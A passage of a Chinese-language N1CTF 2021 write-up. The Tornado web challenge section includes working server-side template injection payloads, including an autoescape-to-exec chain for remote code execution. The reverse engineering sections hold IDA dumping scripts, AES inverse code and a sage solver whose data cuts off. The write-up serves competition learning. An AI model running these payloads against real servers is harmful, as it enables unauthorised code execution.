<h3 id="signin"><a class="header-link" href="#signin"></a>Signin</h3>
<p>写入会urldecode一次，所以将/flag url编码后变换大小写绕过date函数写入文件中，再进行读取就ok了</p>
<p class="img-container"><img src="https://i.imgur.com/AZ5zikE.png" alt=""></p>
<h3 id="qqqueryyy-all-the-things"><a class="header-link" href="#qqqueryyy-all-the-things"></a>QQQueryyy All The Things</h3>
<p><a href="https://harold.kim/blog/2021/11/n1ctf-writeup/">https://harold.kim/blog/2021/11/n1ctf-writeup/</a></p>
<h3 id="easyphp"><a class="header-link" href="#easyphp"></a>Easyphp</h3>
<p><a href="https://harold.kim/blog/2021/11/n1ctf-writeup/">https://harold.kim/blog/2021/11/n1ctf-writeup/</a></p>
<h3 id="funny_web"><a class="header-link" href="#funny_web"></a>Funny_web</h3>
<p><a href="https://harold.kim/blog/2021/11/n1ctf-writeup/">https://harold.kim/blog/2021/11/n1ctf-writeup/</a></p>
<h3 id="tornado"><a class="header-link" href="#tornado"></a>Tornado</h3>
<p>题目环境：python 3.9.7, tornado 6.1</p>
<p>源码app.py:</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> tornado.ioloop
<span class="hljs-keyword">import</span> tornado.web
<span class="hljs-keyword">import</span> builtins
<span class="hljs-keyword">import</span> unicodedata
<span class="hljs-keyword">import</span> uuid
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filter</span><span class="hljs-params">(data)</span>:</span>
    data = unicodedata.normalize(<span class="hljs-string">'NFKD'</span>,data)
    <span class="hljs-keyword">if</span> len(data) &gt; <span class="hljs-number">1024</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r'__|\(|\)|datetime|sys|import'</span>,data):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> builtins.__dict__.keys():
        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> data:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(tornado.web.RequestHandler)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self)</span>:</span>
        self.render(<span class="hljs-string">"templates/index.html"</span>,)
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self)</span>:</span>
        data = self.get_argument(<span class="hljs-string">"data"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filter(data):
            self.finish(<span class="hljs-string">"no no no"</span>)
        <span class="hljs-keyword">else</span>:
            id = uuid.uuid4()
            f = open(f<span class="hljs-string">"uploads/{id}.html"</span>,<span class="hljs-string">'w'</span>)
            f.write(data)
            f.close()
            <span class="hljs-keyword">try</span>:
                self.render(f<span class="hljs-string">"uploads/{id}.html"</span>,)
            <span class="hljs-keyword">except</span>:
                self.finish(<span class="hljs-string">"error"</span>)
            os.unlink(f<span class="hljs-string">"uploads/{id}.html"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> tornado.web.Application([
        (<span class="hljs-string">r"/"</span>, IndexHandler),
    ],compiled_template_cache=<span class="hljs-keyword">False</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app = make_app()
    app.listen(<span class="hljs-number">8888</span>)
    tornado.ioloop.IOLoop.current().start()</code></pre><ul class="list">
<li>post的data在通过<code>filter()</code>检验之后会写入到 <code>uploads/{uuid}.html</code>，然后经过tornado的模板引擎渲染，最后删除uploads下的这个文件。</li>
<li><code>filter()</code>主要限制了data的长度，并且不允许一些关键字出现。比如网上最常见的Tornado SSTI payload:<code>{% import os %}{{ os.system(&#39;id&#39;) }}</code> 这里的 import 就在 builtins 里，不能用</li>
</ul>
<p>要想寻找其他执行代码的方法，先来读一下文档，看看除了 import 还有没有什么特殊的 tag：<a href="https://www.tornadoweb.org/en/stable/template.html#syntax-reference">https://www.tornadoweb.org/en/stable/template.html#syntax-reference</a></p>
<p>其中 raw 和 autoescape 比较特别，前者可以返回 python 代码的执行结果，后者接收一个函数，用来对当前文件里所有 block 的输出进行编码。在 <code>tornado/template.py</code> 里可以看到它的实现：</p>
<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_Expression</span><span class="hljs-params">(_Node)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, expression: str, line: int, raw: bool = False)</span> -&gt; <span class="hljs-keyword">None</span>:</span>
        self.expression = expression
        self.line = line
        self.raw = raw

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span><span class="hljs-params">(self, writer: <span class="hljs-string">"_CodeWriter"</span>)</span> -&gt; <span class="hljs-keyword">None</span>:</span>
        writer.write_line(<span class="hljs-string">"_tt_tmp = %s"</span> % self.expression, self.line) <span class="hljs-comment"># ⚠vulnerable</span>
        writer.write_line(
            <span class="hljs-string">"if isinstance(_tt_tmp, _tt_string_types):"</span> <span class="hljs-string">" _tt_tmp = _tt_utf8(_tt_tmp)"</span>,
            self.line,
        )
        writer.write_line(<span class="hljs-string">"else: _tt_tmp = _tt_utf8(str(_tt_tmp))"</span>, self.line)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.raw <span class="hljs-keyword">and</span> writer.current_template.autoescape <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
            <span class="hljs-comment"># In python3 functions like xhtml_escape return unicode,</span>
            <span class="hljs-comment"># so we have to convert to utf8 again.</span>
            writer.write_line(
                <span class="hljs-string">"_tt_tmp = _tt_utf8(%s(_tt_tmp))"</span> % writer.current_template.autoescape, <span class="hljs-comment"># ⚠vulnerable</span>
                self.line,
            )
        writer.write_line(<span class="hljs-string">"_tt_append(_tt_tmp)"</span>, self.line)</code></pre><p>可以看到 raw 和 autoescape 都是直接把参数拼接到代码里执行。如果我们能在代码运行的context里找到类似 eval 或者 os 这些 function或者说module, 就能通过类似
 <code>{% autoescape xx.yy.zz.eval %} {{ &#39;print(1)&#39; }}</code></p>
<p>这样的方法来RCE，这相当于 <code>eval(&#39;print(1)&#39;)</code>。</p>
<p>怎么在context找这些函数呢，只需要在app.py的 render() 下个断点，一步一步跟,template.py拼接这些 <code>_tt_xxxxx</code> 的python代码之后总会要通过exec执行一下</p>
<p>比如327行这里self.code就是编译模板要执行的代码：</p>
<p class="img-container"><img src="https://i.imgur.com/2WluHMI.png" alt=""></p>
<p>362行的 execute() 就是执行代码的地方，此时step into一次然后切到debugger的console就有对应的上下文了</p>
<p class="img-container"><img src="https://i.imgur.com/P9Gwde7.png" alt=""></p>
<p>最终我找到了 exec：</p>
<pre class="hljs"><code>{% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}
{{ request.headers[<span class="hljs-string">"z"</span>] }}
</code></pre><p>把要执行的python代码放在request header里就行了:</p>
<p class="img-container"><img src="https://i.imgur.com/sfoBfjG.png" alt=""></p>
<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="easyre"><a class="header-link" href="#easyre"></a>Easyre</h3>
<p>题目用到了avx指令集,整个控制流非常长,需要模拟执行来dump下来</p>
<p>我用的是ida自动单步来求解的</p>
<p>脚本</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> idaapi
<span class="hljs-keyword">import</span> idautils
<span class="hljs-keyword">import</span> ida_dbg
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> ida_bytes
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *

keyreg=<span class="hljs-string">'xmm0'</span>
g_fp=open(<span class="hljs-string">'flow.txt'</span>,<span class="hljs-string">'w+'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myexit</span><span class="hljs-params">()</span>:</span>
    g_fp.close()
    exit()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log_code</span><span class="hljs-params">(code)</span>:</span>
    <span class="hljs-keyword">global</span> g_fp
    g_fp.write(code+<span class="hljs-string">'\n'</span>)
    print(code)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cvt_xmmi</span><span class="hljs-params">(s)</span>:</span>
    a=<span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
        a+=<span class="hljs-string">'\\x'</span>+hex(i)[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">return</span> <span class="hljs-string">'b2m(\"'</span>+a+<span class="hljs-string">'\")'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi</span><span class="hljs-params">(ip)</span>:</span>
    <span class="hljs-keyword">global</span> keyreg
    opreg=<span class="hljs-string">''</span>
    val_idx=<span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)==keyreg:
        opreg=print_operand(ip,<span class="hljs-number">2</span>)
        val_idx=<span class="hljs-number">2</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">2</span>)!=keyreg:
            myexit()
        opreg=print_operand(ip,<span class="hljs-number">1</span>)
        val_idx=<span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">'rbp'</span>)!=<span class="hljs-number">-1</span>:
        rbp_off=get_operand_value(ip,val_idx)
        rbp_off=struct.unpack(<span class="hljs-string">'q'</span>,struct.pack(<span class="hljs-string">'Q'</span>,rbp_off))[<span class="hljs-number">0</span>]
        rbp=ida_dbg.get_reg_val(<span class="hljs-string">'rbp'</span>)
        data_pos=rbp+rbp_off
        bdata=ida_bytes.get_bytes(data_pos,<span class="hljs-number">16</span>)
        <span class="hljs-keyword">return</span> cvt_xmmi(bdata)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> cvt_xmmi(ida_dbg.get_reg_val(opreg))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi2</span><span class="hljs-params">(ip)</span>:</span>
    <span class="hljs-keyword">global</span> keyreg
    <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)!=keyreg:
        myexit()
    opreg=print_operand(ip,<span class="hljs-number">2</span>)
    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">'rbp'</span>)!=<span class="hljs-number">-1</span>:
        rbp_off=get_operand_value(ip,<span class="hljs-number">2</span>)
        rbp_off=struct.unpack(<span class="hljs-string">'q'</span>,struct.pack(<span class="hljs-string">'Q'</span>,rbp_off))[<span class="hljs-number">0</span>]
        rbp=ida_dbg.get_reg_val(<span class="hljs-string">'rbp'</span>)
        data_pos=rbp+rbp_off
        bdata=ida_bytes.get_bytes(data_pos,<span class="hljs-number">16</span>)
        <span class="hljs-keyword">return</span> cvt_xmmi(bdata)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> cvt_xmmi(ida_dbg.get_reg_val(opreg))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpxor</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi(ip)
    log_code(<span class="hljs-string">'dst=xorq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpaddq</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi(ip)
    log_code(<span class="hljs-string">'dst=addq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpsubq</span><span class="hljs-params">(ip)</span>:</span>
    <span class="hljs-keyword">global</span> keyreg
    xmmi=prase_opxmmi(ip)
    <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)!=keyreg:
        myexit()
    <span class="hljs-keyword">else</span>:
        log_code(<span class="hljs-string">'dst=subq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenc</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi2(ip)
    log_code(<span class="hljs-string">'dst=aesenc(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenclast</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi2(ip)
    log_code(<span class="hljs-string">'dst=aesenclast(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdec</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi2(ip)
    log_code(<span class="hljs-string">'dst=aesdec(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdeclast</span><span class="hljs-params">(ip)</span>:</span>
    xmmi=prase_opxmmi2(ip)
    log_code(<span class="hljs-string">'dst=aesdeclast(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpshufd</span><span class="hljs-params">(ip)</span>:</span>
    _ord=hex(get_operand_value(ip,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:]
    log_code(<span class="hljs-string">'dst=pshufd(dst,0x'</span>+_ord+<span class="hljs-string">');'</span>)
<span class="hljs-keyword">while</span>(<span class="hljs-keyword">True</span>):
    <span class="hljs-keyword">if</span> ip == <span class="hljs-number">0x7FF6C0AD88FA</span>:
            myexit()
    ip=ida_dbg.get_reg_val(<span class="hljs-string">"rip"</span>)
    <span class="hljs-comment">#print(hex(ip)[2:])</span>
    dis=GetDisasm(ip)
    mnem=print_insn_mnem(ip)
    <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">0</span>)==keyreg:
        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">'vmovdqa'</span>:
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">'vpxor'</span>:
            prase_vpxor(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpshufd'</span>:
            prase_vpshufd(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpaddq'</span>:
            prase_vpaddq(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpsubq'</span>:
            prase_vpsubq(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesenc'</span>:
            prase_vaesenc(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesenclast'</span>:
            prase_vaesenclast(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesdec'</span>:
            prase_vaesdec(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesdeclast'</span>:
            prase_vaesdeclast(ip)
        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesimc'</span>:
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">break</span>

    ida_dbg.step_over()
    ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP,<span class="hljs-number">2</span>)</code></pre><p>这个脚本可以dump出原先的控制流逻辑,遇到把keyreg赋值的指令就停止,keyreg可能是xmm0或者xmm4</p>
<p>然后用该脚本将整个控制流翻转</p>
<pre class="hljs"><code>fp=open(<span class="hljs-string">'newflow.txt'</span>,<span class="hljs-string">'r'</span>)
flow_array=[]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fp:
    flow_array.append(i)

print(len(flow_array))
alls=<span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flow_array)):
    line=flow_array[len(flow_array)-i<span class="hljs-number">-1</span>]
    newline=line[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">'re_'</span>+line[<span class="hljs-number">6</span>:]
    alls+=newline

fp.close();
fp=open(<span class="hljs-string">'rev_flow.txt'</span>,<span class="hljs-string">'w+'</span>)

fp.write(alls)
fp.close()</code></pre><p>相关逆运算</p>
<pre class="hljs"><code>__<span class="hljs-function">m128i <span class="hljs-title">re_aesenc</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
    AddRoundKey(&amp;v, &amp;k);
    MixColumnsRe(&amp;v);
    SubBytesRe(&amp;v, &amp;v, <span class="hljs-number">16</span>);
    ShiftRowsRe(&amp;v);
    <span class="hljs-keyword">return</span> v;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_aesdec</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
    AddRoundKey(&amp;v, &amp;k);
    MixColumns(&amp;v);
    SubBytes(&amp;v, &amp;v, <span class="hljs-number">16</span>);
    ShiftRows(&amp;v);
    <span class="hljs-keyword">return</span> v;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_aesenclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
    AddRoundKey(&amp;v, &amp;k);
    SubBytesRe(&amp;v, &amp;v, <span class="hljs-number">16</span>);
    ShiftRowsRe(&amp;v);
    <span class="hljs-keyword">return</span> v;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_aesdeclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
    AddRoundKey(&amp;v, &amp;k);
    SubBytes(&amp;v, &amp;v, <span class="hljs-number">16</span>);
    ShiftRows(&amp;v);
    <span class="hljs-keyword">return</span> v;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_aesimc</span><span class="hljs-params">(__m128i v)</span> </span>{
    MixColumns(&amp;v);
    <span class="hljs-keyword">return</span> v;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_pshufd</span><span class="hljs-params">(__m128i v, UCHAR ord)</span> </span>{
    UCHAR ord_1 = ord &amp; <span class="hljs-number">0b00000011</span>;
    UCHAR ord_2 = (ord &amp; <span class="hljs-number">0b00001111</span>) &gt;&gt; <span class="hljs-number">2</span>;
    UCHAR ord_3 = (ord &amp; <span class="hljs-number">0b00111111</span>) &gt;&gt; <span class="hljs-number">4</span>;
    UCHAR ord_4 = (ord &amp; <span class="hljs-number">0b11111111</span>) &gt;&gt; <span class="hljs-number">6</span>;

    <span class="hljs-keyword">int</span> ord_off[<span class="hljs-number">4</span>] = { <span class="hljs-number">0</span> };
    ord_off[<span class="hljs-number">0</span>] = ord_1;
    ord_off[<span class="hljs-number">1</span>] = ord_2;
    ord_off[<span class="hljs-number">2</span>] = ord_3;
    ord_off[<span class="hljs-number">3</span>] = ord_4;

    <span class="hljs-keyword">int</span> hits[<span class="hljs-number">4</span>] = { <span class="hljs-number">0</span> };
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
        hits[ord_off[i]] = <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
        <span class="hljs-keyword">if</span> (hits[i] == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"invaild pshufd ord\n"</span>);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
        }
    }
    __m128i result = { <span class="hljs-number">0</span> };
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
        ((<span class="hljs-keyword">int</span>*)&amp;result)[ord_off[i]] = ((<span class="hljs-keyword">int</span>*)&amp;v)[i];
    }
    <span class="hljs-keyword">return</span> result;
}
__<span class="hljs-function">m128i <span class="hljs-title">re_addq</span><span class="hljs-params">(__m128i he, __m128i v2)</span> </span>{
    <span class="hljs-keyword">return</span> _mm_sub_epi64(he, v2);
}
__<span class="hljs-function">m128i <span class="hljs-title">re_subq</span><span class="hljs-params">(__m128i jieguo, __m128i jianshu)</span> </span>{
    <span class="hljs-keyword">return</span> _mm_add_epi64(jieguo, jianshu);
}
__<span class="hljs-function">m128i <span class="hljs-title">re_xorq</span><span class="hljs-params">(__m128i v, __m128i v2)</span> </span>{
    <span class="hljs-keyword">return</span> _mm_xor_si128(v, v2);
}
__<span class="hljs-function">m128i <span class="hljs-title">b2m</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* code)</span> </span>{
    <span class="hljs-keyword">return</span> *(__m128i*)code;
}</code></pre><p>把rev_flow.txt里的c代码复制到vs里编译,堆栈设置100mb即可运行
Flag :
n1ctf{Easy_AVX!}</p>
<h3 id="hello"><a class="header-link" href="#hello"></a>Hello</h3>
<p>golang逆向</p>
<p>输入一串16进制数</p>
<p>题目先对输入做了一堆表变换，然后又检查一个线性方程组</p>
<p>线性方程组是模0x125意义下的，这个模操作被编译器优化成了一些乘法和减法，需要按照算术结构猜一下</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> sage.all <span class="hljs-keyword">import</span> *

F = Zmod(<span class="hljs-number">0x125</span>)

dats = [
    (
        <span class="hljs-number">5377102</span>, <span class="hljs-number">44718284</span>, <span class="hljs-number">65149487</span>, <span class="hljs-number">35629177</span>, <span class="hljs-number">16687834</span>, <span class="hljs-number">12649121</span>, <span class="hljs-number">20133359</span>, <span class="hljs-number">27627194</span>, <span class="hljs-number">8881295</span>, <span class="hljs-number">52185491</span>, <span class="hljs-number">17564837</span>,
        <span class="hljs-number">1272949</span>,
        <span class="hljs-number">51420184</span>, <span class="hljs-number">15249722</span>, <span class="hljs-number">40743553</span>, <span class="hljs-number">11448910</span>, <span class="hljs-number">68</span>),
    (<span class="hljs-number">15513275</span>, <span class="hljs-number">48100308</span>, <span class="hljs-number">8677693</span>, <span class="hljs-number">410852</span>, <span class="hljs-number">14512921</span>, <span class="hljs-number">40946083</span>, <span class="hljs-number">11650930</span>, <span class="hljs-number">46765687</span>, <span class="hljs-number">3705469</span>, <span class="hljs-number">34235932</span>, <span class="hljs-number">37493724</span>, <span class="hljs-number">31668013</span>,
     <span class="hljs-number">58592730</span>, <span class="hljs-number">35099188</span>, <span class="hljs-number">46007731</span>, <span class="hljs-number">48411728</span>, <span class="hljs-number">73</span>),
    (<span class="hljs-number">51342117</span>, <span class="hljs-number">17611295</span>, <span class="hljs-number">46626798</span>, <span class="hljs-number">44419237</span>, <span class="hljs-number">41219106</span>, <span class="hljs-number">12201596</span>, <span class="hljs-number">52093804</span>, <span class="hljs-number">15752138</span>, <span class="hljs-number">20900966</span>, <span class="hljs-number">34002181</span>, <span class="hljs-number">3328881</span>,
     <span class="hljs-number">9778043</span>, <span class="hljs-number">61937243</span>, <span class="hljs-number">28320092</span>, <span class="hljs-number">22952329</span>, <span class="hljs-number">11388094</span>, <span class="hljs-number">105</span>),
    (<span class="hljs-number">57970260</span>, <span class="hljs-number">46862881</span>, <span class="hljs-number">45916134</span>, <span class="hljs-number">43159917</span>, <span class="hljs-number">28388843</span>, <span class="hljs-number">9676221</span>, <span class="hljs-number">36591851</span>, <span class="hljs-number">16650010</span>, <span class="hljs-number">36167240</span>, <span class="hljs-number">63801756</span>, <span class="hljs-number">45673314</span>,
     <span class="hljs-number">59151919</span>, <span class="hljs-number">23972020</span>, <span class="hljs-number">38457326</span>, <span class="hljs-number">2137413</span>, <span class="hljs-number">34715169</span>, <span class="hljs-number">26</span>),
    (<span class="hljs-number">32808901</span>, <span class="hljs-number">11375397</span>, <span class="hljs-number">28326782</span>, <span class="hljs-number">40013998</span>, <span class="hljs-number">40100057</span>, <span class="hljs-number">56977904</span>, <span class="hljs-number">23526593</span>, <span class="hljs-number">21483823</span>, <span class="hljs-number">56539279</span>, <span class="hljs-number">10941397</span>, <span class="hljs-number">24023407</span>,
     <span class="hljs-number">66315899</span>, <span class="hljs-number">50854754</span>, <span class="hljs-number">20365833</span>, <span class="hljs-number">49899769</span>, <span class="hljs-number">65951721</span>, <span class="hljs-number">278</span>),
    (<span class="hljs-number">52471216</span>, <span class="hljs-number">40551307</span>, <span class="hljs-number">47833723</span>, <span class="hljs-number">32746957</span>, <span class="hljs-number">282427</span>, <span class="hljs-number">36309373</span>, <span class="hljs-number">52604124</span>, <span class="hljs-number">63871055</span>, <span class="hljs-number">34514986</span>, <span class="hljs-number">25927713</span>, <span class="hljs-number">11073096</span>,
     <span class="hljs-number">11857558</span>, <span class="hljs-number">39192608</span>, <span class="hljs-number">53262276</span>, <span class="hljs-number">8291395</span>, <span class="hljs-number">13044253</span>, <span class="hljs-number">236</span>),
    (<span class="hljs-number">24199242</span>, <span class="hljs-number">37064630</span>, <span class="hljs-number">47531426</span>, <span class="hljs-number">66810519</span>, <span class="hljs-number">61739612</span>, <span class="hljs-number">62585890</span>, <span class="hljs-number">38269989</span>, <span class="hljs-number">32578112</span>, <span class="hljs-number">28922206</span>, <span class="hljs-number">17699555</span>, <span class="hljs-number">52918290</span>,
     <span class="hljs-number">6761227</span>, <span class="hljs-number">30745745</span>, <span class="hljs-number">1682385</span>, <span class="hljs-number">48980070</span>, <span class="hljs-number">37348869</span>, <span class="hljs-number">261</span>),
    (
        <span class="hljs-number">12966608</span>, <span class="hljs-number">34693296</span>, <span class="hljs-number">54221555</span>, <span class="hljs-number">32345456</span>, <span class="hljs-number">1903443</span>, <span class="hljs-number">34021426</span>, <span class="hljs-number">50757695</span>, <span class="hljs-number">9801829</span>, <span class="hljs-number">41831746</span>, <span class="hljs-number">45032298</span>, <span class="hljs-number">9672908</span>,
        <span class="hljs-number">58876674</span>,
        <span class="hljs-number">65789447</span>, <span class="hljs-number">60438120</span>, <span class="hljs-number">30396598</span>, <span class="hljs-number">62202924</span>, <span class="hljs-number">90</span>),
    (<span class="hljs-number">25298698</span>, <span class="hljs-number">55027617</span>, <span class="hljs-number">63071621</span>, <span class="hljs-number">7969099</span>, <span class="hljs-number">49780363</span>, <span class="hljs-number">63670216</span>, <span class="hljs-number">50679759</span>, <span class="hljs-number">41122881</span>, <span class="hljs-number">18966262</span>, <span class="hljs-number">17349024</span>, <span class="hljs-number">2668953</span>,
     <span class="hljs-number">59077744</span>, <span class="hljs-number">8593554</span>, <span class="hljs-number">34796144</span>, <span class="hljs-number">31874820</span>, <span class="hljs-number">29937890</span>, <span class="hljs-number">173</span>),
    (
        <span class="hljs-number">599957</span>, <span class="hljs-number">11891252</span>, <span class="hljs-number">34874075</span>, <span class="hljs-number">32524194</span>, <span class="hljs-number">61745538</span>, <span class="hljs-number">26060497</span>, <span class="hljs-number">18424162</span>, <span class="hljs-number">53660494</span>, <span class="hljs-number">1201444</span>, <span class="hljs-number">54575969</span>, <span class="hljs-number">37180051</span>,
        <span class="hljs-number">62966701</span>,
        <span class="hljs-number">39797887</span>, <span class="hljs-number">16103318</span>, <span class="hljs-number">57153581</span>, <span class="hljs-number">17388834</span>, <span class="hljs-number">55</span>),
    (
        <span class="hljs-number">52820893</span>, <span class="hljs-number">49623029</span>, <span class="hljs-number">9330086</span>, <span class="hljs-number">27114985</span>, <span class="hljs-number">61462529</span>, <span class="hljs-number">61723044</span>, <span class="hljs-number">8246048</span>, <span class="hljs-number">59291588</span>, <span class="hljs-number">35129803</span>, <span class="hljs-number">18108987</span>, <span class="hljs-number">7550306</span>,
        <span class="hljs-number">67056908</span>,
        <span class="hljs-number">31750158</span>, <span class="hljs-number">42011531</span>, <span class="hljs-number">18660303</span>, <span class="hljs-number">28288668</span>, <span class="hljs-number">229</span>),
    (
        <span class="hljs-number">3226343</span>, <span class="hljs-number">63976576</span>, <span class="hljs-number">64477078</span>, <span class="hljs-number">20940616</span>, <span class="hljs-number">32271858</span>, <span class="hljs-number">8400987</span>, <span class="hljs-number">32491361</span>, <span class="hljs-number">32731509</span>, <span class="hljs-number">36725663</span>, <span class="hljs-number">1598982</span>, <span class="hljs-number">37370364</span>,
        <span class="hljs-number">41009760</span>,
        <span class="hljs-number">58809916</span>, <span class="hljs-number">51093211</span>, <span class="hljs-number">43880816</span>, <span class="hljs-number">21003028</span>, <span class="hljs-number">292</span>),
    (<span class="hljs-number">11484407</span>, <span class="hljs-number">18322594</span>, <span class="hljs-number">31148317</span>, <span class="hljs-number">52408555</span>, <span class="hljs-number">59525552</span>, <span class="hljs-number">5235806</span>, <span class="hljs-number">6702116</span>, <span class="hljs-number">53260842</span>, <span class="hljs-number">19179549</span>, <span class="hljs-number">23703928</span>, <span class="hljs-number">20336759</span>,
     <span class="hljs-number">24738818</span>, <span class="hljs-number">21200580</span>, <span class="hljs-number">63640408</span>, <span class="hljs-number">51302172</span>, <span class="hljs-number">7196185</span>, <span class="hljs-number">43</span>),
    (<span class="hljs-number">28563837</span>, <span class="hljs-number">14524437</span>, <span class="hljs-number">11571592</span>, <span class="hljs-number">44514143</span>, <span class="hljs-number">42212815</span>, <span class="hljs-number">49813519</span>, <span class="hljs-number">54404660</span>, <span class="hljs-number">28977207</span>, <span class="hljs-number">50811576</span>, <span class="hljs-number">11016018</span>, <span class="hljs-number">34665752</span>,
